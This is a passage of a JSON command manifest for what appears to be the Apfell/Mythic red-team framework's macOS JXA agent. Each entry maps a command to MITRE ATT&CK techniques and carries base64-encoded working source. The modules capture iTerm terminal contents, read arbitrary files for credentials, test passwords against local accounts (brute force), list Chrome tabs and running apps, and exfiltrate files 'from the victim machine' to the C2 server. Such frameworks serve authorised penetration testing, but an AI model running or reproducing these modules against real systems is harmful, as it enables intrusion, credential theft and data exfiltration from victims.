pdAogICAgICAgICQuTlNUaHJlYWQuc2xlZXBGb3JUaW1lSW50ZXJ2YWwoMyk7CiAgICAgICAgbGV0IGZpbGVNYW5hZ2VyID0gJC5OU0ZpbGVNYW5hZ2VyLmRlZmF1bHRNYW5hZ2VyOwogICAgICAgIGZpbGVNYW5hZ2VyLnJlbW92ZUl0ZW1BdFBhdGhFcnJvcigkKHRlbXBfZmlsZSksICQoKSk7CiAgICAgICAgcmV0dXJuIHsidXNlcl9vdXRwdXQiOiAiQ3JlYXRlZCB0ZW1wIGZpbGU6ICIgKyB0ZW1wX2ZpbGUgKyAiLCBzdGFydGVkIHByb2Nlc3MgYW5kIHJlbW92ZWQgZmlsZSIsICJjb21wbGV0ZWQiOiB0cnVlLCAiYXJ0aWZhY3RzIjogYXJ0aWZhY3RzfTsKICAgIH1jYXRjaChlcnJvcil7CiAgICAgICAgcmV0dXJuIHsidXNlcl9vdXRwdXQiOmVycm9yLnRvU3RyaW5nKCksICJjb21wbGV0ZWQiOiB0cnVlLCAic3RhdHVzIjogImVycm9yIiwgImFydGlmYWN0cyI6IGFydGlmYWN0c307CiAgICB9Cn07CkNPTU1BTkRfRU5EU19IRVJFCiAgICA="
            }
          ],
          "transforms": []
        },
        {
          "needs_admin": false,
          "help_cmd": "iTerm",
          "version": 1,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "",
          "is_remove_file": false,
          "remove_file_parameters": "",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "Read the contents of all open iTerm tabs if iTerms is open, otherwise just inform the operator that it's not currently running",
          "cmd": "iTerm",
          "parameters": [],
          "attack": [
            {
              "t_num": "T1139",
              "attack_name": "Bash History"
            },
            {
              "t_num": "T1056",
              "attack_name": "Input Capture"
            }
          ],
          "artifacts": [],
          "files": [
            {
              "iTerm.js": "ZXhwb3J0cy5pVGVybSA9IGZ1bmN0aW9uKHRhc2ssIGNvbW1hbmQsIHBhcmFtcyl7CiAgICB0cnl7CiAgICAgICAgbGV0IHRlcm0gPSBBcHBsaWNhdGlvbigiaVRlcm0iKTsKICAgICAgICBpZighdGVybS5ydW5uaW5nKCkpewogICAgICAgICAgICB0ZXJtID0gQXBwbGljYXRpb24oImlUZXJtMiIpOyAgLy8gaXQgbWlnaHQgYmUgaVRlcm0yIGluc3RlYWQgb2YgaVRlcm0gaW4gc29tZSBpbnN0YW5jZXMsIHRyeSBib3RoCiAgICAgICAgfQogICAgICAgIGxldCBvdXRwdXQgPSB7fTsKICAgICAgICBpZih0ZXJtLnJ1bm5pbmcoKSl7CiAgICAgICAgICAgIGZvcihsZXQgaSA9IDA7IGkgPCB0ZXJtLndpbmRvd3MubGVuZ3RoOyBpKyspewogICAgICAgICAgICAgICAgbGV0IHdpbmRvdyA9IHt9OwogICAgICAgICAgICAgICAgZm9yKGxldCBqID0gMDsgaiA8IHRlcm0ud2luZG93c1tpXS50YWJzLmxlbmd0aDsgaisrKXsKICAgICAgICAgICAgICAgICAgICBsZXQgdGFiX2luZm8gPSB7fTsKICAgICAgICAgICAgICAgICAgICB0YWJfaW5mb1sndHR5J10gPSB0ZXJtLndpbmRvd3NbaV0udGFic1tqXS5jdXJyZW50U2Vzc2lvbi50dHkoKTsKICAgICAgICAgICAgICAgICAgICB0YWJfaW5mb1snbmFtZSddID0gdGVybS53aW5kb3dzW2ldLnRhYnNbal0uY3VycmVudFNlc3Npb24ubmFtZSgpOwogICAgICAgICAgICAgICAgICAgIHRhYl9pbmZvWydjb250ZW50cyddID0gdGVybS53aW5kb3dzW2ldLnRhYnNbal0uY3VycmVudFNlc3Npb24uY29udGVudHMoKTsKICAgICAgICAgICAgICAgICAgICB0YWJfaW5mb1sncHJvZmlsZU5hbWUnXSA9IHRlcm0ud2luZG93c1tpXS50YWJzW2pdLmN1cnJlbnRTZXNzaW9uLnByb2ZpbGVOYW1lKCk7CiAgICAgICAgICAgICAgICAgICAgd2luZG93WyJUYWI6ICIgKyBqXSA9IHRhYl9pbmZvOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgb3V0cHV0WyJXaW5kb3c6ICIgKyBpXSA9IHdpbmRvdzsKICAgICAgICAgICAgfQogICAgICAgICAgICByZXR1cm4geyJ1c2VyX291dHB1dCI6SlNPTi5zdHJpbmdpZnkob3V0cHV0LCBudWxsLCAyKSwgImNvbXBsZXRlZCI6IHRydWV9OwogICAgICAgIH0KICAgICAgICBlbHNlewogICAgICAgICAgICByZXR1cm4geyJ1c2VyX291dHB1dCI6ImlUZXJtIGlzbid0IHJ1bm5pbmciLCAiY29tcGxldGVkIjogdHJ1ZSwgInN0YXR1cyI6ICJlcnJvciJ9OwogICAgICAgIH0KICAgIH1jYXRjaChlcnJvcil7CiAgICAgICAgcmV0dXJuIHsidXNlcl9vdXRwdXQiOmVycm9yLnRvU3RyaW5nKCksICJjb21wbGV0ZWQiOiB0cnVlLCAic3RhdHVzIjogImVycm9yIn07CiAgICB9Cn07CkNPTU1BTkRfRU5EU19IRVJF"
            }
          ],
          "transforms": []
        },
        {
          "needs_admin": false,
          "help_cmd": "pwd",
          "version": 1,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "",
          "is_remove_file": false,
          "remove_file_parameters": "",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "Prints the current working directory for the agent",
          "cmd": "pwd",
          "parameters": [],
          "attack": [
            {
              "t_num": "T1083",
              "attack_name": "File and Directory Discovery"
            }
          ],
          "artifacts": [],
          "files": [
            {
              "pwd.js": "ZXhwb3J0cy5wd2QgPSBmdW5jdGlvbih0YXNrLCBjb21tYW5kLCBwYXJhbXMpewogICAgdHJ5ewogICAgICAgIGxldCBmaWxlTWFuYWdlciA9ICQuTlNGaWxlTWFuYWdlci5kZWZhdWx0TWFuYWdlcjsKICAgICAgICBsZXQgY3dkID0gZmlsZU1hbmFnZXIuY3VycmVudERpcmVjdG9yeVBhdGg7CiAgICAgICAgaWYoY3dkID09PSB1bmRlZmluZWQgfHwgY3dkID09PSAiIil7CiAgICAgICAgICAgIHJldHVybiB7InVzZXJfb3V0cHV0IjoiQ1dEIGlzIGVtcHR5IG9yIHVuZGVmaW5lZCIsICJjb21wbGV0ZWQiOiB0cnVlLCAic3RhdHVzIjogImVycm9yIn07CiAgICAgICAgfQogICAgICAgIHJldHVybiB7InVzZXJfb3V0cHV0Ijpjd2QuanMsICJjb21wbGV0ZWQiOiB0cnVlfTsKICAgIH1jYXRjaChlcnJvcil7CiAgICAgICAgcmV0dXJuIHsidXNlcl9vdXRwdXQiOmVycm9yLnRvU3RyaW5nKCksICJjb21wbGV0ZWQiOiB0cnVlLCAic3RhdHVzIjogImVycm9yIn07CiAgICB9Cn07CkNPTU1BTkRfRU5EU19IRVJF"
            }
          ],
          "transforms": []
        },
        {
          "needs_admin": false,
          "help_cmd": "cat \/path\/to\/file",
          "version": 2,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "",
          "is_remove_file": false,
          "remove_file_parameters": "",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "Read the contents of a file and display it to the user. No need for quotes and relative paths are fine",
          "cmd": "cat",
          "parameters": [
            {
              "type": "String",
              "hint": "path to file (no quotes required)",
              "choices": "",
              "required": false,
              "name": "path"
            }
          ],
          "attack": [
            {
              "t_num": "T1081",
              "attack_name": "Credentials in Files"
            },
            {
              "t_num": "T1106",
              "attack_name": "Execution through API"
            }
          ],
          "artifacts": [],
          "files": [
            {
              "cat.js": "ZXhwb3J0cy5jYXQgPSBmdW5jdGlvbih0YXNrLCBjb21tYW5kLCBwYXJhbXMpewogICAgdHJ5ewogICAgICAgIGxldCBjb21tYW5kX3BhcmFtcyA9IEpTT04ucGFyc2UocGFyYW1zKTsKICAgICAgICBpZighY29tbWFuZF9wYXJhbXMuaGFzT3duUHJvcGVydHkoJ3BhdGgnKSl7cmV0dXJuIHsidXNlcl9vdXRwdXQiOiAiTWlzc2luZyBwYXRoIHBhcmFtZXRlciIsICJjb21wbGV0ZWQiOiB0cnVlLCAic3RhdHVzIjogImVycm9yIn19CiAgICAgICAgbGV0IGNvbnRlbnRzID0gJC5OU1N0cmluZy5zdHJpbmdXaXRoQ29udGVudHNPZkZpbGVFbmNvZGluZ0Vycm9yKCQoY29tbWFuZF9wYXJhbXNbJ3BhdGgnXSksICQuTlNVVEY4U3RyaW5nRW5jb2RpbmcsICQoKSkuanM7CiAgICAgICAgaWYoY29udGVudHMgPT09ICIiKXsKICAgICAgICAgICAgcmV0dXJuIHsidXNlcl9vdXRwdXQiOiAiTm8gb3V0cHV0IGZyb20gY29tbWFuZCIsICJjb21wbGV0ZWQiOiB0cnVlfTsKICAgICAgICB9CiAgICAgICAgZWxzZSBpZihjb250ZW50cyA9PT0gdHJ1ZSl7CiAgICAgICAgICAgIHJldHVybiB7InVzZXJfb3V0cHV0IjogIlRydWUiLCAiY29tcGxldGVkIjogdHJ1ZX07CiAgICAgICAgfQogICAgICAgIGVsc2UgaWYoY29udGVudHMgPT09IGZhbHNlKXsKICAgICAgICAgICAgcmV0dXJueyJ1c2VyX291dHB1dCI6ICJGYWxzZSIsICJjb21wbGV0ZWQiOiB0cnVlfTsKICAgICAgICB9CiAgICAgICAgZWxzZSBpZihjb250ZW50cyA9PT0gdW5kZWZpbmVkKXsKICAgICAgICAgICAgcmV0dXJuIHsidXNlcl9vdXRwdXQiOiAiRmFpbGVkIHRvIHJlYWQgZmlsZS4gRWl0aGVyIHlvdSBkb24ndCBoYXZlIHBlcm1pc3Npb25zIG9yIHRoZSBmaWxlIGRvZXNuJ3QgZXhpc3QiLCAiY29tcGxldGVkIjogdHJ1ZSwgInN0YXR1cyI6ICJlcnJvciJ9OwogICAgICAgIH0KICAgICAgICByZXR1cm4geyJ1c2VyX291dHB1dCI6IGNvbnRlbnRzLCAiY29tcGxldGVkIjogdHJ1ZX07CiAgICB9CiAgICBjYXRjaChlcnJvcil7CiAgICAgICAgcmV0dXJuIHsidXNlcl9vdXRwdXQiOiBlcnJvci50b1N0cmluZygpLCAic3RhdHVzIjogImVycm9yIiwgImNvbXBsZXRlZCI6IHRydWV9OwogICAgfQp9OwpDT01NQU5EX0VORFNfSEVSRQ=="
            }
          ],
          "transforms": [
            {
              "order": 1,
              "parameter": "path",
              "active": true,
              "description": "",
              "timestamp": "05\/07\/2020 07:01:49",
              "command": "cat",
              "command_id": 38,
              "payload_type": "apfell-jxa",
              "transform": "jsonSingleParameter",
              "parameter_type": "String"
            }
          ]
        },
        {
          "needs_admin": false,
          "help_cmd": "test_password with no args uses blank password and current user. or, test_password {\"username\": \"bob\", \"password\": \"bob\"}",
          "version": 1,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "",
          "is_remove_file": false,
          "remove_file_parameters": "",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "Tests a password against a user to see if it's valid via an API call",
          "cmd": "test_password",
          "parameters": [
            {
              "type": "Credential",
              "hint": "",
              "choices": "",
              "required": false,
              "name": "password"
            },
            {
              "type": "Credential",
              "hint": "",
              "choices": "",
              "required": false,
              "name": "username"
            }
          ],
          "attack": [
            {
              "t_num": "T1110",
              "attack_name": "Brute Force"
            }
          ],
          "artifacts": [],
          "files": [
            {
              "test_password.js": "ZXhwb3J0cy50ZXN0X3Bhc3N3b3JkID0gZnVuY3Rpb24odGFzaywgY29tbWFuZCwgcGFyYW1zKXsKICAgIE9iakMuaW1wb3J0KCdDb2xsYWJvcmF0aW9uJyk7CiAgICBPYmpDLmltcG9ydCgnQ29yZVNlcnZpY2VzJyk7CiAgICBsZXQgYXV0aG9yaXR5ID0gJC5DQklkZW50aXR5QXV0aG9yaXR5LmRlZmF1bHRJZGVudGl0eUF1dGhvcml0eTsKICAgIGxldCB1c2VybmFtZSA9IGFwZmVsbC51c2VyOwogICAgbGV0IHBhc3N3b3JkID0gIiI7CiAgICBpZihwYXJhbXMubGVuZ3RoID4gMCl7CiAgICAgICAgbGV0IGRhdGEgPSBKU09OLnBhcnNlKHBhcmFtcyk7CiAgICAgICAgaWYoZGF0YS5oYXNPd25Qcm9wZXJ0eSgndXNlcm5hbWUnKSAmJiBkYXRhWyd1c2VybmFtZSddICE9PSAiIil7CiAgICAgICAgICAgIHVzZXJuYW1lID0gZGF0YVsndXNlcm5hbWUnXTsKICAgICAgICB9CiAgICAgICAgaWYoZGF0YS5oYXNPd25Qcm9wZXJ0eSgncGFzc3dvcmQnKSAmJiBkYXRhWydwYXNzd29yZCddICE9PSAiIil7CiAgICAgICAgICAgIHBhc3N3b3JkID0gZGF0YVsncGFzc3dvcmQnXTsKICAgICAgICB9CiAgICAgICAgLy8gaWYgbm8gcGFzc3dvcmQgaXMgc3VwcGxpZWQsIHRyeSBhbiBlbXB0eSBwYXNzd29yZAogICAgfQogICAgbGV0IHVzZXIgPSAkLkNCSWRlbnRpdHkuaWRlbnRpdHlXaXRoTmFtZUF1dGhvcml0eSgkKHVzZXJuYW1lKSwgYXV0aG9yaXR5KTsKICAgIGlmKHVzZXIuanMgIT09IHVuZGVmaW5lZCl7CiAgICAgICAgaWYodXNlci5hdXRoZW50aWNhdGVXaXRoUGFzc3dvcmQoJChwYXNzd29yZCkpKXsKICAgICAgICAgICAgcmV0dXJuIHsidXNlcl9vdXRwdXQiOiJTdWNjZXNzZnVsIGF1dGhlbnRpY2F0aW9uIiwgImNvbXBsZXRlZCI6IHRydWV9OwogICAgICAgIH0KICAgICAgICBlbHNlewogICAgICAgICAgICByZXR1cm4geyJ1c2VyX291dHB1dCI6IkZhaWxlZCBhdXRoZW50aWNhdGlvbiIsICJjb21wbGV0ZWQiOiB0cnVlfTsKICAgICAgICB9CiAgICB9CiAgICBlbHNlewogICAgICAgIHJldHVybiB7InVzZXJfb3V0cHV0IjoiVXNlciBkb2VzIG5vdCBleGlzdCIsICJjb21wbGV0ZWQiOiB0cnVlLCAic3RhdHVzIjogImVycm9yIn07CiAgICB9Cn07CkNPTU1BTkRfRU5EU19IRVJF"
            }
          ],
          "transforms": [
            {
              "order": 1,
              "parameter": "",
              "active": true,
              "description": "",
              "timestamp": "05\/07\/2020 07:01:49",
              "command": "test_password",
              "command_id": 39,
              "payload_type": "apfell-jxa",
              "transform": "apfelljxa_test_password_shorthand",
              "parameter_type": "None"
            }
          ]
        },
        {
          "needs_admin": false,
          "help_cmd": "system_info {\"method\": \"jxa\"}",
          "version": 1,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "",
          "is_remove_file": false,
          "remove_file_parameters": "",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "This uses JXA to get some system information. It doesn't send Apple Events to any other applications though, so it shouldn't cause popups.",
          "cmd": "system_info",
          "parameters": [
            {
              "type": "Choice",
              "hint": "",
              "choices": "jxa",
              "required": false,
              "name": "method"
            }
          ],
          "attack": [
            {
              "t_num": "T1082",
              "attack_name": "System Information Discovery"
            }
          ],
          "artifacts": [],
          "files": [
            {
              "system_info.js": "ZXhwb3J0cy5zeXN0ZW1faW5mbyA9IGZ1bmN0aW9uKHRhc2ssIGNvbW1hbmQsIHBhcmFtcyl7CiAgICBsZXQgbWV0aG9kID0gImp4YSI7CiAgICBsZXQgZGF0YSA9ICIiOwogICAgdHJ5ewogICAgICAgIGlmKHBhcmFtcy5sZW5ndGggPiAwKXsKICAgICAgICAgICAgZGF0YSA9IEpTT04ucGFyc2UocGFyYW1zKTsKICAgICAgICAgICAgaWYoZGF0YS5oYXNPd25Qcm9wZXJ0eSgnbWV0aG9kJykgJiYgZGF0YVsnbWV0aG9kJ10gIT09ICIiKXsKICAgICAgICAgICAgICAgIG1ldGhvZCA9IGRhdGFbJ21ldGhvZCddOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGlmKG1ldGhvZCA9PT0gImp4YSIpewogICAgICAgICAgICBsZXQgb3V0cHV0ID0gSlNPTi5zdHJpbmdpZnkoY3VycmVudEFwcC5zeXN0ZW1JbmZvKCksIG51bGwsIDIpOwogICAgICAgICAgICByZXR1cm4geyJ1c2VyX291dHB1dCI6b3V0cHV0LCAiY29tcGxldGVkIjogdHJ1ZX07CiAgICAgICAgfWVsc2V7CiAgICAgICAgICAgIHJldHVybiB7InVzZXJfb3V0cHV0IjoiTWV0aG9kIHVua25vd24iLCAiY29tcGxldGVkIjogdHJ1ZSwgInN0YXR1cyI6ICJlcnJvciJ9OwogICAgICAgIH0KICAgIH1jYXRjaChlcnJvcil7CiAgICAgICAgcmV0dXJuIHsidXNlcl9vdXRwdXQiOmVycm9yLnRvU3RyaW5nKCksICJjb21wbGV0ZWQiOiB0cnVlLCAic3RhdHVzIjogImVycm9yIn07CiAgICB9Cn07CkNPTU1BTkRfRU5EU19IRVJF"
            }
          ],
          "transforms": []
        },
        {
          "needs_admin": false,
          "help_cmd": "download {path to remote file}",
          "version": 6,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "",
          "is_remove_file": false,
          "remove_file_parameters": "",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "Download a file from the victim machine to the apfell server in chunks (no need for quotes in the path). It will be saved to app\/files\/{operation name}\/downloads\/{hostname}\/{filename}",
          "cmd": "download",
          "parameters": [],
          "attack": [
            {
              "t_num": "T1020",
              "attack_name": "Automated Exfiltration"
            },
            {
              "t_num": "T1030",
              "attack_name": "Data Transfer Size Limits"
            },
            {
              "t_num": "T1041",
              "attack_name": "Exfiltration Over Command and Control Channel"
            }
          ],
          "artifacts": [],
          "files": [
            {
              "download.js": "ZXhwb3J0cy5kb3dubG9hZCA9IGZ1bmN0aW9uKHRhc2ssIGNvbW1hbmQsIHBhcmFtcyl7CiAgICB0cnl7CiAgICAJaWYocGFyYW1zID09PSAiIiB8fCBwYXJhbXMgPT09IHVuZGVmaW5lZCl7cmV0dXJuIHsndXNlcl9vdXRwdXQnOiAiTXVzdCBzdXBwbHkgYSBwYXRoIHRvIGEgZmlsZSB0byBkb3dubG9hZCIsICJjb21wbGV0ZWQiOiB0cnVlLCAic3RhdHVzIjogImVycm9yIn07IH0KICAgICAgICByZXR1cm4gQzIuZG93bmxvYWQodGFzaywgcGFyYW1zKTsKICAgIH1jYXRjaChlcnJvcil7CiAgICAgICAgcmV0dXJuIHsndXNlcl9vdXRwdXQnOiBlcnJvci50b1N0cmluZygpLCAiY29tcGxldGVkIjogdHJ1ZSwgInN0YXR1cyI6ICJlcnJvciJ9OwogICAgfQoKfTsKQ09NTUFORF9FTkRTX0hFUkU="
            }
          ],
          "transforms": [],
          "browser_script": "ZnVuY3Rpb24odGFzaywgcmVzcG9uc2VzKXsKICBpZih0YXNrLmNvbXBsZXRlZCA9PT0gdHJ1ZSAmJiB0YXNrLnN0YXR1cyAhPT0gJ2Vycm9yJyl7CiAgICB0cnl7CiAgICAgICAgbGV0IHN0YXR1cyA9IEpTT04ucGFyc2UocmVzcG9uc2VzWzBdWydyZXNwb25zZSddKTsKICAgICAgICBpZihzdGF0dXMuaGFzT3duUHJvcGVydHkoJ2FnZW50X2ZpbGVfaWQnKSl7CiAgICAgICAgCWxldCBmaWxlX25hbWUgPSB0YXNrWydwYXJhbXMnXTsKCQkgICAgICBsZXQgb3V0cHV0ID0gIjxkaXYgY2xhc3M9J2NhcmQnPjxkaXYgY2xhc3M9J2NhcmQtaGVhZGVyIGJvcmRlciBib3JkZXItZGFyayBzaGFkb3cnPkZpbmlzaGVkIERvd25sb2FkaW5nIDxzcGFuIGNsYXNzPSdkaXNwbGF5Jz4iICsgZmlsZV9uYW1lICsgIjwvc3Bhbj4uIENsaWNrIDxhIGhyZWY9Jy9hcGkvdjEuNC9maWxlcy9kb3dubG9hZC8iICsgc3RhdHVzWydhZ2VudF9maWxlX2lkJ10gKyAiJz5oZXJlPC9hPiB0byBkb3dubG9hZDwvZGl2PjwvZGl2PiI7CgkJICAgICAgcmV0dXJuIG91dHB1dDsKCSAgICAJfQogICAgfWNhdGNoKGVycm9yKXsKICAgICAgIHJldHVybiAiPHByZT5FcnJvcjogIiArIGVycm9yLnRvU3RyaW5nKCkgKyAiXG4iICsgSlNPTi5zdHJpbmdpZnkocmVzcG9uc2VzLCBudWxsLCAyKSArICI8L3ByZT4iOwogICAgfQogIH0KICBpZih0YXNrLnN0YXR1cyA9PT0gJ2Vycm9yJyl7CiAgCXJldHVybiAiPHByZT4gRXJyb3I6IHVudG9nZ2xlIGZvciBlcnJvciBtZXNzYWdlKHMpIDwvcHJlPiI7CiAgfQogIHJldHVybiAiPHByZT4gRG93bmxvYWRpbmcuLi4gPC9wcmU+IjsKfQ=="
        },
        {
          "needs_admin": false,
          "help_cmd": "chrome_tabs",
          "version": 1,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "",
          "is_remove_file": false,
          "remove_file_parameters": "",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "This uses JXA to list information about all of the open tabs in all of the open Chrome instances. If Chrome is not currently running, this will launch Chrome (potential OPSEC issue) and might have a conflict with trying to access Chrome tabs as Chrome is starting. It's recommended to not use this unless Chrome is already running. Use the list_apps function to check if Chrome is running.\nIn Mojave this will cause a popup the first time asking for permission for your process to access Chrome.",
          "cmd": "chrome_tabs",
          "parameters": [],
          "attack": [
            {
              "t_num": "T1010",
              "attack_name": "Application Window Discovery"
            }
          ],
          "artifacts": [],
          "files": [
            {
              "chrome_tabs.js": "ZXhwb3J0cy5jaHJvbWVfdGFicyA9IGZ1bmN0aW9uKHRhc2ssIGNvbW1hbmQsIHBhcmFtcyl7CglsZXQgdGFicyA9IHt9OwoJdHJ5ewoJCWxldCBjaCA9IEFwcGxpY2F0aW9uKCJHb29nbGUgQ2hyb21lIik7CgkJaWYoY2gucnVubmluZygpKXsKICAgICAgICAgICAgZm9yIChsZXQgaSA9IDA7IGkgPCBjaC53aW5kb3dzLmxlbmd0aDsgaSsrKXsKICAgICAgICAgICAgICAgIGxldCB3aW4gPSBjaC53aW5kb3dzW2ldOwogICAgICAgICAgICAgICAgdGFic1siV2luZG93ICIgKyBpXSA9IHt9OwogICAgICAgICAgICAgICAgZm9yIChsZXQgaiA9IDA7IGogPCB3aW4udGFicy5sZW5ndGg7IGorKyl7CiAgICAgICAgICAgICAgICAgICAgbGV0IHRhYiA9IHdpbi50YWJzW2pdOwogICAgICAgICAgICAgICAgICAgIHRhYnNbIldpbmRvdyAiICsgaV1bIlRhYiAiICsgal0gPSB7InRpdGxlIjogdGFiLnRpdGxlKCksICJ1cmwiOiB0YWIudXJsKCl9OwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfWVsc2V7CiAgICAgICAgICAgIHJldHVybiB7InVzZXJfb3V0cHV0IjogIkNocm9tZSBpcyBub3QgcnVubmluZyIsICJjb21wbGV0ZWQiOiB0cnVlLCAic3RhdHVzIjogImVycm9yIn07CiAgICAgICAgfQoJfWNhdGNoKGVycm9yKXsKCQlsZXQgZXJyID0gZXJyb3IudG9TdHJpbmcoKTsKCQlpZihlcnIgPT09ICJFcnJvcjogQW4gZXJyb3Igb2NjdXJyZWQuIil7CgkJICAgIGVyciArPSAiIEFwZmVsbCB3YXMgZGVuaWVkIGFjY2VzcyB0byBHb29nbGUgQ2hyb21lIChlaXRoZXIgYnkgcG9wdXAgb3IgcHJpb3IgZGVueSkuIjsKCQl9CgkJcmV0dXJuIHsidXNlcl9vdXRwdXQiOmVyciwgImNvbXBsZXRlZCI6IHRydWUsICJzdGF0dXMiOiAiZXJyb3IifTsKCX0KCXJldHVybiB7InVzZXJfb3V0cHV0IjogSlNPTi5zdHJpbmdpZnkodGFicywgbnVsbCwgMiksICJjb21wbGV0ZWQiOiB0cnVlfTsKfTsKQ09NTUFORF9FTkRTX0hFUkU="
            }
          ],
          "transforms": []
        },
        {
          "needs_admin": false,
          "help_cmd": "list_apps",
          "version": 1,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "",
          "is_process_list": true,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "",
          "is_remove_file": false,
          "remove_file_parameters": "",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "This uses NSApplication.RunningApplications api to get information about running applications.",
          "cmd": "list_apps",
          "parameters": [],
          "attack": [
            {
              "t_num": "T1057",
              "attack_name": "Process Discovery"
            }
          ],
          "artifacts": [],
          "files": [
            {
              "list_apps.js": "ZXhwb3J0cy5saXN0X2FwcHMgPSBmdW5jdGlvbih0YXNrLCBjb21tYW5kLCBwYXJhbXMpewogICAgT2JqQy5pbXBvcnQoJ0FwcEtpdCcpOwogICAgdHJ5ewogICAgICAgIGxldCBuYW1lcyA9IFtdOwogICAgICAgIGxldCBwcm9jcyA9ICQuTlNXb3Jrc3BhY2Uuc2hhcmVkV29ya3NwYWNlLnJ1bm5pbmdBcHBsaWNhdGlvbnMuanM7CiAgICAgICAgZm9yKGxldCBpID0gMDsgaSA8IHByb2NzLmxlbmd0aDsgaSsrKXsKICAgICAgICAgICAgbGV0IGluZm8gPSB7fTsKICAgICAgICAgICAgaW5mb1snZnJvbnRNb3N0J10gPSBwcm9jc1tpXS5hY3RpdmU7CiAgICAgICAgICAgIGluZm9bJ2hpZGRlbiddID0gcHJvY3NbaV0uaGlkZGVuOwogICAgICAgICAgICBpbmZvWydidW5kbGUnXSA9IHByb2NzW2ldLmJ1bmRsZUlkZW50aWZpZXIuanM7CiAgICAgICAgICAgIGluZm9bJ2J1bmRsZVVSTCddID0gcHJvY3NbaV0uYnVuZGxlVVJMLnBhdGguanM7CiAgICAgICAgICAgIGluZm9bJ2Jpbl9wYXRoJ10gPSBwcm9jc1tpXS5leGVjdXRhYmxlVVJMLnBhdGguanM7CiAgICAgICAgICAgIGluZm9bJ3Byb2Nlc3NfaWQnXSA9IHByb2NzW2ldLnByb2Nlc3NJZGVudGlmaWVyOwogICAgICAgICAgICBpbmZvWyduYW1lJ10gPSBwcm9jc1tpXS5sb2NhbGl6ZWROYW1lLmpzOwogICAgICAgICAgICBpZihwcm9jc1tpXS5leGVjdXRhYmxlQXJjaGl0ZWN0dXJlID09PSAiMTY3NzcyMjMiKXsKICAgICAgICAgICAgICAgIGluZm9bJ2FyY2hpdGVjdHVyZSddID0gIng2NCI7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSBpZihwcm9jc1tpXS5leGVjdXRhYmxlQXJjaGl0ZWN0dXJlID09PSAiNyIpewogICAgICAgICAgICAgICAgaW5mb1snYXJjaGl0ZWN0dXJlJ10gPSAieDg2IjsKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlIGlmKHByb2NzW2ldLmV4ZWN1dGFibGVBcmNoaXRlY3R1cmUgPT09ICIxOCIpewogICAgICAgICAgICAgICAgaW5mb1snYXJjaGl0ZWN0dXJlJ10gPSAieDg2X1BQQyI7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSBpZihwcm9jc1tpXS5leGVjdXRhYmxlQXJjaGl0ZWN0dXJlID09PSAiMTY3NzcyMzQiKXsKICAgICAgICAgICAgICAgIGluZm9bJ2FyY2hpdGVjdHVyZSddID0gIng4Nl82NF9QUEMiOwogICAgICAgICAgICB9CiAgICAgICAgICAgIG5hbWVzLnB1c2goaW5mbyk7CiAgICAgICAgfQogICAgICAgIHJldHVybiB7InVzZXJfb3V0cHV0IjpKU09OLnN0cmluZ2lmeShuYW1lcywgbnVsbCwgMiksICJjb21wbGV0ZWQiOiB0cnVlfTsKICAgIH1jYXRjaChlcnJvcil7CiAgICAgICAgcmV0dXJuIHsidXNlcl9vdXRwdXQiOmVycm9yLnRvU3RyaW5nKCksICJjb21wbGV0ZWQiOiB0cnVlLCAic3RhdHVzIjogImVycm9yIn07CiAgICB9Cn07CkNPTU1BTkRfRU5EU19IRVJF"
            }
          ],
          "transforms": [],
